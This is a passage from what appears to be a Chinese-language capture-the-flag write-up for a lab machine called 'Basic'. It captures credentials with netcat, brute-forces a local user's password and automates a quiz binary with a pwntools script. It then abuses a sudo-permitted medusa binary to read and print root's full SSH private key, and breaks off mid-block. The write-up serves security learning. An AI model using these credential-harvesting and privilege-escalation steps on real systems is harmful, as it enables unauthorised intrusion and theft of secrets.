class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/basic]<br>└─# nc -lvnp 4444<br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.48] 57332<br>GET / HTTP/1.1<br>Host: 192.168.2.4:4444<br>Accept: */*<br>Authorization: Basic Y25oeWs6YmNmODI5NjI3ZWVhMzY0YTNhYmM0MWE2NTM3ZmJmNTQzZTk3NGZmOA==<br></code></pre></td></tr></table></figure><p>解密</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/basic]<br>└─# <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Y25oeWs6YmNmODI5NjI3ZWVhMzY0YTNhYmM0MWE2NTM3ZmJmNTQzZTk3NGZmOA==&quot;</span> | <span class="hljs-built_in">base64</span> -d<br>cnhyk:bcf829627eea364a3abc41a6537fbf543e974ff8  <br></code></pre></td></tr></table></figure><h2 id="4、获取USER权限"><a href="#4、获取USER权限" class="headerlink" title="4、获取USER权限"></a>4、获取USER权限</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/basic]<br>└─# ssh cnhyk@192.168.2.48<br>cnhyk@192.168.2.48<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Linux Basic 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><span class="hljs-string"></span><br><span class="hljs-string">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="hljs-string">the exact distribution terms for each program are described in the</span><br><span class="hljs-string">individual files in /usr/share/doc/*/copyright.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="hljs-string">permitted by applicable law.</span><br><span class="hljs-string">cnhyk@Basic:~$ id</span><br><span class="hljs-string">uid=1000(cnhyk) gid=1000(cnhyk) groups=1000(cnhyk)</span><br></code></pre></td></tr></table></figure><p><strong>USER FLAG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">cnhyk@Basic:~$ <span class="hljs-built_in">cat</span> user.txt <br>flag&#123;user-df31759540dc28f75a20f443a19b1148&#125;<br></code></pre></td></tr></table></figure><h1 id="四、权限提升"><a href="#四、权限提升" class="headerlink" title="四、权限提升"></a>四、权限提升</h1><h2 id="1、获取JOJO权限"><a href="#1、获取JOJO权限" class="headerlink" title="1、获取JOJO权限"></a>1、获取JOJO权限</h2><p>在<code>/home</code>目录下面，发现用户<code>jojo</code></p><h3 id="方法一-爆破"><a href="#方法一-爆破" class="headerlink" title="方法一 爆破"></a>方法一 爆破</h3><p>直接尝试爆破用户<code>jojo</code>的密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">cnhyk@Basic:/tmp$ ./suForce -u jojo -w pass.txt <br>            _____                          <br> ___ _   _ |  ___|__  _ __ ___ ___   <br>/ __| | | || |_ / _ \| <span class="hljs-string">&#x27;__/ __/ _ \ </span><br><span class="hljs-string">\__ \ |_| ||  _| (_) | | | (_|  __/  </span><br><span class="hljs-string">|___/\__,_||_|  \___/|_|  \___\___|  </span><br><span class="hljs-string">───────────────────────────────────</span><br><span class="hljs-string"> code: d4t4s3c     version: v1.0.0</span><br><span class="hljs-string">───────────────────────────────────</span><br><span class="hljs-string">🎯 Username | jojo</span><br><span class="hljs-string">📖 Wordlist | pass.txt</span><br><span class="hljs-string">🔎 Status   | 2814/10000/28%/jojo</span><br><span class="hljs-string">💥 Password | jojo</span><br><span class="hljs-string">───────────────────────────────────</span><br></code></pre></td></tr></table></figure><p>找到密码：<code>jojo</code></p><h3 id="方法二OPT"><a href="#方法二OPT" class="headerlink" title="方法二OPT"></a>方法二OPT</h3><p>在<code>/opt</code>目录下面找到可执行文件<code>jojo</code>，尝试执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">cnhyk@Basic:/opt$ ./jojo<br>问题 1: 请输入 67+30<br>107<br>错误！<br>问题 2: 请输入 64+74<br>64+74<br>正确！<br>问题 3: 请输入 80+11<br>80+11<br>正确！<br>问题 4: 请输入 76+61<br></code></pre></td></tr></table></figure><p>上传一个<code>socat</code>，将文件挂载到端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cnhyk@Basic:/tmp$ ./socat TCP-LISTEN:6666,reuseaddr,fork EXEC:/opt/jojo,pty,stderr,setsid<br></code></pre></td></tr></table></figure><p>然后写个脚本执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> re<br><br>r = remote(<span class="hljs-string">&quot;192.168.2.48&quot;</span>, <span class="hljs-number">6666</span>)<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br><span class="hljs-keyword">try</span>:<br>data = r.recv(timeout=<span class="hljs-number">2</span>).decode(errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br><span class="hljs-built_in">print</span>(data, end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br><span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">r&quot;请输入\s*([\d+\-*/\s]+)&quot;</span>, data)<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>expr = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>).strip()<br>r.sendline(expr.encode())<br><span class="hljs-keyword">except</span> EOFError:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Connection closed.&quot;</span>)<br><span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>找到密码<code>jojo</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507091524377.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/basic]<br>└─# ssh jojo@192.168.2.48  <br>jojo@192.168.2.48<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Linux Basic 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><span class="hljs-string"></span><br><span class="hljs-string">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="hljs-string">the exact distribution terms for each program are described in the</span><br><span class="hljs-string">individual files in /usr/share/doc/*/copyright.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="hljs-string">permitted by applicable law.</span><br><span class="hljs-string">jojo@Basic:~$ id</span><br><span class="hljs-string">uid=1001(jojo) gid=1001(jojo) groups=1001(jojo)</span><br></code></pre></td></tr></table></figure><h2 id="2、获取ROOT权限"><a href="#2、获取ROOT权限" class="headerlink" title="2、获取ROOT权限"></a>2、获取ROOT权限</h2><p>执行<code>sudo -l</code>，发现<code>/usr/bin/medusa</code>可以执行<code>root</code>权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">jojo@Basic:~$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> jojo on Basic:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User jojo may run the following commands on Basic:<br>    (ALL) NOPASSWD: /usr/bin/medusa<br></code></pre></td></tr></table></figure><p>查看使用命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">jojo@Basic:~$ /usr/bin/medusa -h<br>Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks &lt;jmk@foofus.net&gt;<br><br>/usr/bin/medusa: option requires an argument -- <span class="hljs-string">&#x27;h&#x27;</span><br>CRITICAL: Unknown error processing command-line options.<br>ALERT: Host information must be supplied.<br><br>Syntax: Medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]<br>  -h [TEXT]    : Target hostname or IP address<br>  -H [FILE]    : File containing target hostnames or IP addresses<br>  -u [TEXT]    : Username to <span class="hljs-built_in">test</span><br>  -U [FILE]    : File containing usernames to <span class="hljs-built_in">test</span><br>  -p [TEXT]    : Password to <span class="hljs-built_in">test</span><br>  -P [FILE]    : File containing passwords to <span class="hljs-built_in">test</span><br>  -C [FILE]    : File containing combo entries. See README <span class="hljs-keyword">for</span> more information.<br>  -O [FILE]    : File to append <span class="hljs-built_in">log</span> information to<br>  -e [n/s/ns]  : Additional password checks ([n] No Password, [s] Password = Username)<br>  -M [TEXT]    : Name of the module to execute (without the .mod extension)<br>  -m [TEXT]    : Parameter to pass to the module. This can be passed multiple <span class="hljs-built_in">times</span> with a<br>                 different parameter each <span class="hljs-keyword">time</span> and they will all be sent to the module (i.e.<br>                 -m Param1 -m Param2, etc.)<br>  -d           : Dump all known modules<br>  -n [NUM]     : Use <span class="hljs-keyword">for</span> non-default TCP port number<br>  -s           : Enable SSL<br>  -g [NUM]     : Give up after trying to connect <span class="hljs-keyword">for</span> NUM seconds (default 3)<br>  -r [NUM]     : Sleep NUM seconds between retry attempts (default 3)<br>  -R [NUM]     : Attempt NUM retries before giving up. The total number of attempts will be NUM + 1.<br>  -c [NUM]     : Time to <span class="hljs-built_in">wait</span> <span class="hljs-keyword">in</span> usec to verify socket is available (default 500 usec).<br>  -t [NUM]     : Total number of logins to be tested concurrently<br>  -T [NUM]     : Total number of hosts to be tested concurrently<br>  -L           : Parallelize logins using one username per thread. The default is to process <br>                 the entire username before proceeding.<br>  -f           : Stop scanning host after first valid username/password found.<br>  -F           : Stop audit after first valid username/password found on any host.<br>  -b           : Suppress startup banner<br>  -q           : Display module<span class="hljs-string">&#x27;s usage information</span><br><span class="hljs-string">  -v [NUM]     : Verbose level [0 - 6 (more)]</span><br><span class="hljs-string">  -w [NUM]     : Error debug level [0 - 10 (more)]</span><br><span class="hljs-string">  -V           : Display version</span><br><span class="hljs-string">  -Z [TEXT]    : Resume scan based on map of previous scan</span><br></code></pre></td></tr></table></figure><p>读取<code>root</code>的私钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">jojo@Basic:~$ <span class="hljs-built_in">sudo</span> medusa -H /root/.ssh/id_rsa -u root -p root -M ssh<br>Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks &lt;jmk@foofus.net&gt;<br><br>CRITICAL: Failed to resolve hostname: -----BEGIN OPENSSH PRIVATE KEY----- - Name or service not known<br>CRITICAL: Failed to resolve hostname: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn - Name or service not known<br>CRITICAL: Failed to resolve hostname: NhAAAAAwEAAQAAAYEAuo7fDpWRyh52wo83HNHA5DwnBTEx1Y/hs7jnh5GCIBMxK9kg0A9d - Name or service not known<br>CRITICAL: Failed to resolve hostname: aKHnmsDfnG22fr9ZB3XGDJjZpg86E4MGmzXAQ2FMZfcy0vJ90CIQ4kKrvzj2XvWpu+BkMZ - Name or service not known<br>CRITICAL: Failed to resolve hostname: ibARGcZa0hzOk+RtbFnWGWWOUx0cTtNiEEWx3v43k8ELG1guQ4PU0jIlV6D70F2R9P6tfn - Name or service not known<br>CRITICAL: Failed to resolve hostname: BOxr88YSnSsQu0RErnfg+TR2Vs1EGBpC2vY9yhQOn2X3XeCL2ewznq21DLojMkeW/1lyPn - Name or service not known<br>CRITICAL: Failed to resolve hostname: j/isRTkYXToi+qG+B5KheUtJSGcXb9YMDM4kbCJ0EzRY2lkcZ8Lu8c+6Xyr46nzCKLcx4l - Name or service not known<br>CRITICAL: Failed to resolve hostname: o13VHNraz6nA1gZZJCOhsaX8h7qdDp4bFFAkDEsIEdWJn3oygQ6HuddXfqlJ+lxw6+ANRw - Name or service not known<br>CRITICAL: Failed to resolve hostname: jeGQoLCKj1ut0y5AbFmXvNY+DqaFiQr1YbvuWfm7L2l53ca3HMkK0HytG0o7VzAkyLGUpZ - Name or service not known<br>CRITICAL: Failed to resolve hostname: yv+sF4sspTwdxT7UBt8RVmdOBdU8KhwOgqojj0+rAAAFgCbRPJIm0TySAAAAB3NzaC1yc2 - Name or service not known<br>CRITICAL: Failed to resolve hostname: EAAAGBALqO3w6VkcoedsKPNxzRwOQ8JwUxMdWP4bO454eRgiATMSvZINAPXWih55rA35xt - Name or service not known<br>CRITICAL: Failed to resolve hostname: tn6/WQd1xgyY2aYPOhODBps1wENhTGX3MtLyfdAiEOJCq7849l71qbvgZDGYmwERnGWtIc - Name or service not known<br>CRITICAL: Failed to resolve hostname: zpPkbWxZ1hlljlMdHE7TYhBFsd7+N5PBCxtYLkOD1NIyJVeg+9BdkfT+rX5wTsa/PGEp0r - Name or service not known<br>CRITICAL: Failed to resolve hostname: ELtERK534Pk0dlbNRBgaQtr2PcoUDp9l913gi9nsM56ttQy6IzJHlv9Zcj54/4rEU5GF06 - Name or service not known<br>CRITICAL: Failed to resolve hostname: IvqhvgeSoXlLSUhnF2/WDAzOJGwidBM0WNpZHGfC7vHPul8q+Op8wii3MeJaNd1Rza2s+p - Name or service not known<br>CRITICAL: Failed to resolve hostname: wNYGWSQjobGl/Ie6nQ6eGxRQJAxLCBHViZ96MoEOh7nXV36pSfpccOvgDUcI3hkKCwio9b - Name or service not known<br>CRITICAL: Failed to resolve hostname: rdMuQGxZl7zWPg6mhYkK9WG77ln5uy9ped3GtxzJCtB8rRtKO1cwJMixlKWcr/rBeLLKU8 - Name or service not known<br>CRITICAL: Failed to resolve hostname: HcU+1AbfEVZnTgXVPCocDoKqI49PqwAAAAMBAAEAAAGBALdrFJ9QKqBfxz+Ocw8gotdC1N - Name or service not known<br>CRITICAL: Failed to resolve hostname: JkBa0E41FB8FD3nMpQVD3aIkqtcJcY547dJnyz2YNQOgX9oxRri0GbIuxgHDSpajhVBzoR - Name or service not known<br>CRITICAL: Failed to resolve hostname: CqUfyNbDR3pNNnKxXHkMay7OdXPVqEAqwmutBthiUdpv+qa7dYg8/vhQ9zAK0i+LhXlOju - Name or service not known<br>CRITICAL: Failed to resolve hostname: GS9vST0T9kAbEV/QZQP9my0W4Bi57pm1F3YoGn/7E+c5BdSJF7JQY+lj5kQ2roQuPVSHMr - Name or service not known<br>CRITICAL: Failed to resolve hostname: W0OvK5C8jBvsiV7T+xrKClt9OEseNufcUUA5iaKI+G4qwx3znjt548FxxF6q2Jlp5pEThP - Name or service not known<br>CRITICAL: Failed to resolve hostname: AMBPFQvb99HL3MNF/paO2lczp9Jl5puiHOAUBF7lAgGsIYPU3wo5GaWl3IEYnfn7lXziB8 - Name or service not known<br>CRITICAL: Failed to resolve hostname: iVkP0K/gx4yauF159H4IMP7pmh0rDRxLdW2h2GCc2vspJpD9mQ8dBemG+6fUHTJzfgFwR0 - Name or service not known<br>CRITICAL: Failed to resolve hostname: eTHDHJtzj5q5yK4g/5zaRS8+Vx4iTBYw/aBzWr1WkP4OkmLWyx6NZXzEkw/MxdJyF/oQAA - Name or service not known<br>CRITICAL: Failed to resolve hostname: AMAchGFcfzr4d/Rv+Q1eaFzNVGFVAmiW2H2Sz9lOZAXw/jARJww9B3Zg3M9q+b5w4SVMeQ - Name or service not known<br>CRITICAL: Failed to resolve hostname: HJYjgWPy97/KkQZR5U4MC8Ds7zyQY3AhlqJvcDIZeTFMXt44qWmaKiQy2KciVIW30+UAtO - Name or service not known<br>CRITICAL: Failed to resolve hostname: GOBqPoykzbwgLmh5hJmQGpgzssgMhOM7hIcRMP/Ymhsyw8ok9++FEqSN9mUiXSGR7WbGke - Name or service not known<br>CRITICAL: Failed to resolve hostname: esb99CYOsc7YCJ0EeZJJEhQIxwFg094NDCjK83j5yOrDssfNIAAADBAN83PifBNXGdRFN0 - Name or service not known<br>CRITICAL: Failed to resolve hostname: nF5r4QSW1wDQ0CHHOZt0zXYbpjyxASFhtTWfEci5AXWz9jL4qFCLBx77jNfabalhRPlz8E - Name or service not known<br>CRITICAL: Failed to resolve hostname: 8Gavf8rssqD8+ZcHr/bAPSlfxY9Q+5L6FKAdKl7x70qNiYp7btyAuGFWKfn+lH4sSFCVBA - Name or service not known<br>CRITICAL: Failed to resolve hostname: MSDsXSQvL5bB6CGFLASboZJLNYO+0iYJ5nGZch+B3HQQ+sk52A3ipR5Om1Trk+ZelV5iH7 - Name or service not known<br>CRITICAL: Failed to resolve hostname: uMDrSz1Co+0ozDPmfvo9PGrttYqmPpaQAAAMEA1fVTHfJmX8vv4IGthLzeWaosc90bjiMY - Name or service not known<br>CRITICAL: Failed to resolve hostname: 70FX+KImdoi26V61rccY2IBL6X4KffrL1jTuET12czbwGgZh3KpHbFrXNsc/jxV+sUKVJa - Name or service not known<br>CRITICAL: Failed to resolve hostname: aKLFd+UNjg756RvevzBMXr5c9ewE6hcdNiwKDBxkBqSbuiBr+oeSMg0G4ppwCGg+G0lBd/ - Name or service not known<br>CRITICAL: Failed to resolve hostname: ltoRV5MXeIxoYZ6B/jrAbc/Y9kQZ0ozcoSe3zMViGiY++TQf2TPkhiBvu8bRY4vy19nl1c - Name or service not known<br>CRITICAL: Failed to resolve hostname: mM/HtQ/t5mUZnzAAAACnJvb3RAQmFzaWM= - Name or service not known<br>CRITICAL: Failed to resolve hostname: -----END OPENSSH PRIVATE KEY----- - Name or service not known<br></code></pre></td></tr></table></figure><p>处理一下私钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/basic]<br>└─# <span class="hljs-built_in">cat</span> tmp | awk <span class="hljs-string">&#x27;&#123;print $6&#125;&#x27;</span><br>-----BEGIN<br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn<br>NhAAAAAwEAAQAAAYEAuo7fDpWRyh52wo83HNHA5DwnBTEx1Y/hs7jnh5GCIBMxK9kg0A9d<br>aKHnmsDfnG22fr9ZB3XGDJjZpg86E4MGmzXAQ2FMZfcy0vJ90CIQ4kKrvzj2XvWpu+BkMZ<br>ibARGcZa0hzOk+RtbFnWGWWOUx0cTtNiEEWx3v43k8ELG1guQ4PU0jIlV6D70F2R9P6tfn<br>BOxr88YSnSsQu0RErnfg+TR2Vs1EGBpC2vY9yhQOn2X3XeCL2ewznq21DLojMkeW/1lyPn<br>j/isRTkYXToi+qG+B5KheUtJSGcXb9YMDM4kbCJ0EzRY2lkcZ8Lu8c+6Xyr46nzCKLcx4l<br>o13VHNraz6nA1gZZJCOhsaX8h7qdDp4bFFAkDEsIEdWJn3oygQ6HuddXfqlJ+lxw6+ANRw<br>jeGQoLCKj1ut0y5AbFmXvNY+DqaFiQr1YbvuWfm7L2l53ca3HMkK0HytG0o7VzAkyLGUpZ<br>yv+sF4sspTwdxT7UBt8RVmdOBdU8KhwOgqojj0+rAAAFgCbRPJIm0TySAAAAB3NzaC1yc2<br>EAAAGBALqO3w6VkcoedsKPNxzRwOQ8JwUxMdWP4bO454eRgiATMSvZINAPXWih55rA35xt<br>tn6/WQd1xgyY2aYPOhODBps1wENhTGX3MtLyfdAiEOJCq7849l71qbvgZDGYmwERnGWtIc<br>zpPkbWxZ1hlljlMdHE7TYhBFsd7+N5PBCxtYLkOD1NIyJVeg+9BdkfT+rX5wTsa/PGEp0r<br>ELtERK534Pk0dlbNRBgaQtr2PcoUDp9l913gi9nsM56ttQy6IzJHlv9Zcj54/4rEU5GF06<br>IvqhvgeSoXlLSUhnF2/WDAzOJGwidBM0WNpZHGfC7vHPul8q+Op8wii3MeJaNd1Rza2s+p<br>wNYGWSQjobGl/Ie6nQ6eGxRQJAxLCBHViZ96MoEOh7nXV36pSfpccOvgDUcI3hkKCwio9b<br>rdMuQGxZl7zWPg6mhYkK9WG77ln5uy9ped3GtxzJCtB8rRtKO1cwJMixlKWcr/rBeLLKU8<br>HcU+1AbfEVZnTgXVPCocDoKqI49PqwAAAAMBAAEAAAGBALdrFJ9QKqBfxz+Ocw8gotdC1N<br>JkBa0E41FB8FD3nMpQVD3aIkqtcJcY547dJnyz2YNQOgX9oxRri0GbIuxgHDSpajhVBzoR<br>CqUfyNbDR3pNNnKxXHkMay7OdXPVqEAqwmutBthiUdpv+qa7dYg8/vhQ9zAK0i+LhXlOju<br>GS9vST0T9kAbEV/QZQP9my0W4Bi57pm1F3YoGn/7E+c5BdSJF7JQY+lj5kQ2roQuPVSHMr<br>W0OvK5C8jBvsiV7T+xrKClt9OEseNufcUUA5iaKI+G4qwx3znjt548FxxF6q2Jlp5pEThP<br>AMBPFQvb99HL3MNF/paO2lczp9Jl5puiHOAUBF7lAgGsIYPU3wo5GaWl3IEYnfn7lXziB8<br>iVkP0K/gx4yauF159H4IMP7pmh0rDRxLdW2h2GCc2vspJpD9mQ8dBemG+6fUHTJzfgFwR0<br>eTHDHJtzj5q5yK4g/5zaRS8+Vx4iTBYw/aBzWr1WkP4OkmLWyx6NZXzEkw/MxdJyF/oQAA<br>AMAchGFcfzr4d/Rv+Q1eaFzNVGFVAmiW2H2Sz9lOZAXw/jARJww9B3Zg3M9q+b5w4SVMeQ<br>HJYjgWPy97/KkQZR5U4MC8Ds7zyQY3AhlqJvcDIZeTFMXt44qWmaKiQy2KciVIW30+UAtO<br>GOBqPoykzbwgLmh5hJmQGpgzssgMhOM7hIcRMP/Ymhsyw8ok9++FEqSN9mUiXSGR7WbGke<br>esb99CYOsc7YCJ0EeZJJEhQIxwFg094NDCjK83j5yOrDssfNIAAADBAN83PifBNXGdRFN0<br>nF5r4QSW1wDQ0CHHOZt0zXYbpjyxASFhtTWfEci5AXWz9jL4qFCLBx77jNfabalhRPlz8E<br>8Gavf8rssqD8+ZcHr/bAPSlfxY9Q+5L6FKAdKl7x70qNiYp7btyAuGFWKfn+lH4sSFCVBA<br>MSDsXSQvL5bB6CGFLASboZJLNYO+0iYJ5nGZch+B3HQQ+sk52A3ipR5Om1Trk+ZelV5iH7<br>uMDrSz1Co+0ozDPmfvo9PGrttYqmPpaQAAAMEA1fVTHfJmX8vv4IGthLzeWaosc90bjiMY<br>70FX+KImdoi26V61rccY2IBL6X4KffrL1jTuET12czbwGgZh3KpHbFrXNsc/jxV+sUKVJa<br>aKLFd+UNjg756RvevzBMXr5c9ewE6hcdNiwKDBxkBqSbuiBr+oeSMg0G4ppwCGg+G0lBd/<br>ltoRV5MXeIxoYZ6B/jrAbc/Y9kQZ0ozcoSe3zMViGiY++TQf2TPkhiBvu8bRY4vy19nl1c<br>mM/HtQ/t5mUZnzAAAACnJvb3RAQmFzaWM=<br>-----END<br></code></pre></td></tr></table></figure><p>得到完整的私钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">-----BEGIN OPENSSH PRIVATE 